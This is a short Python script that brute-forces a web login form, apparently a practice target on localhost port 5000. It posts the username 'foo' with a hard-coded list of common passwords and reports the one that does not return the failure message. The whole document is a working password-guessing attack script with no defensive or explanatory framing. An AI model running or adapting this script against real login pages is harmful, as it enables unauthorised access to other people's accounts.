import requests

url = "http://127.0.0.1:5000/"  # Target login page
username = "foo"
passwords = ["test123", "admin", "123456", "qwerty", "letmein", "password", "123456", "qwerty", "qwerty123", "12345", "abc123", "secret", "111111", "admin", "letmein", "monkey", "love", "hello", "summer", "sunshine", "baseball", "football", "dragon", "princess", "trustno1", "iloveyou", "whatever", "welcome", "shadow", "superman", "ninja", "michael", "charlie", "ashley", "bailey", "jessica", "passw0rd", "master", "freedom", "starwars", "computer", "taylor", "startrek", "password123", "myprincess", "foo"]

for password in passwords:
    data = {"username": username, "password": password}
    response = requests.post(url, data=data)
    
    if "Invalid username or password" not in response.text:
        print(f"[+] Password found: {password}")
        break
    else:
        print(f"[-] Attempt failed: {password}")
